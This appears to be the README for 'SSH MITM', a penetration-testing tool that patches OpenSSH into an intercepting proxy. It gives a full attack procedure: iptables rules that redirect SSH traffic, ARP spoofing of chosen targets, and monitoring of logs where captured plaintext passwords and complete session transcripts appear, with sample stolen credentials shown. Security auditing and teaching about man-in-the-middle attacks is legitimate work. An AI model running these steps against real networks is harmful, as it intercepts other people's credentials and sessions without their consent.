# SSH MITM v1.1

Author: [Joe Testa](http://www.positronsecurity.com/about-us/) ([@therealjoetesta](https://twitter.com/therealjoetesta))


## Overview

This penetration testing tool allows an auditor to intercept SSH connections.  A patch applied to the OpenSSH v7.5p1 source code causes it to act as a proxy between the victim and their intended SSH server; all plaintext passwords and sessions are logged to disk.

Of course, the victim's SSH client will complain that the server's key has changed.  But because 99.99999% of the time this is caused by a legitimate action (OS re-install, configuration change, etc), many/most users will disregard the warning and continue on.

**NOTE:** Only run the modified *sshd_mitm* in a VM or container!  Ad-hoc edits were made to the OpenSSH sources in critical regions, with no regard to their security implications.  Its not hard to imagine these edits introduce serious vulnerabilities.


## Change Log

* v1.0: May 16, 2017: Initial revision.
* v1.1: ???, 2017: Removed root privilege dependencies, added Kali Linux support.


## To Do

The following list tracks areas to improve:

* Support SFTP MITM'ing.
* Add port forwarding support.
* Create wrapper script that detects when user is trying to use key authentication only, and de-spoof them automatically.


## Initial Setup

As root, run the *install.sh* script.  This will install prerequisites from the repositories, download the OpenSSH archive, verify its signature, compile it, and initialize a non-privileged environment to execute from.


## Running The Attack

1.) Run *sshd_mitm*:

    sudo su - ssh-mitm -c "./run.sh"

2.) Enable IP forwarding:

    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
    sudo iptables -P FORWARD ACCEPT

3.) Allow connections to *sshd_mitm* and re-route forwarded SSH connections:

    sudo iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
    sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222

4.) ARP spoof a target(s) (**Protip:** do NOT spoof all the things!  Your puny network interface won't likely be able to handle an entire network's traffic all at once.  Only spoof a couple IPs at a time):

    arpspoof -r -t 192.168.x.1 192.168.x.5

5.) Monitor *auth.log*.  Intercepted passwords will appear here:

    sudo tail -f /var/log/auth.log

6.) Once a session is established, a full log of all input & output can be found in */home/ssh-mitm/session_\*.txt*.


## Sample Results

Upon success, */var/log/auth.log* will have lines that log the password, like this:

    May 16 23:14:01 showmeyourmoves sshd_mitm[16798]: INTERCEPTED PASSWORD: hostname: [10.199.30.x]; username: [jdog]; password: [supercalifragilistic] [preauth]

Furthermore, the victim's entire SSH session can be found in */home/ssh-mitm/session_\*.txt*:

    # cat /home/ssh-mitm/session_0.txt
    Last login: Tue May 16 21:35:00 2017 from 10.50.22.x
    OpenBSD 6.0-stable (GENERIC.MP) #12: Sat May  6 19:08:31 EDT 2017

    Welcome to OpenBSD: The proactively secure Unix-like operating system.

    Please use the sendbug(1) utility to report bugs in the system.
    Before reporting a bug, please try to reproduce it with the latest
    version of the code.  With bug reports, please try to ensure that
    enough information to reproduce the problem is enclosed, and if a
    known fix for it exists, include that as well.

    jdog@jefferson ~ $ ppss
      PID TT  STAT       TIME COMMAND
    59264 p0  Ss      0:00.02 -bash (bash)
    52132 p0  R+p     0:00.00 ps
    jdog@jefferson ~ $ iidd
    uid=1000(jdog) gid=1000(jdog) groups=1000(jdog), 0(wheel)
    jdog@jefferson ~ $ sssshh  jjtteessttaa@@mmaaggiiccbbooxx
    jtesta@magicbox's password: ROFLC0PTER!!1juan


Note that the characters in the user's commands appear twice in the file because the input from the user is recorded, as well as the output from the shell (which echoes characters back).  Observe that when programs like sudo and ssh temporarily disable echoing in order to read a password, duplicate characters are not logged.


## Developer Documentation

In *lol.h* are two defines: *DEBUG_HOST* and *DEBUG_PORT*.  Enable them and set the hostname to a test server.  Now you can connect to *sshd_mitm* directly without using ARP spoofing in order to test your changes, e.g.:

    ssh -p 2222 valid_user_on_debug_host@localhost

To create a new patch, use these commands:

    pushd openssh-7.5p1-mitm/; make clean; popd
    diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1 openssh-7.5p1-mitm/ > openssh-7.5p1-mitm.patch
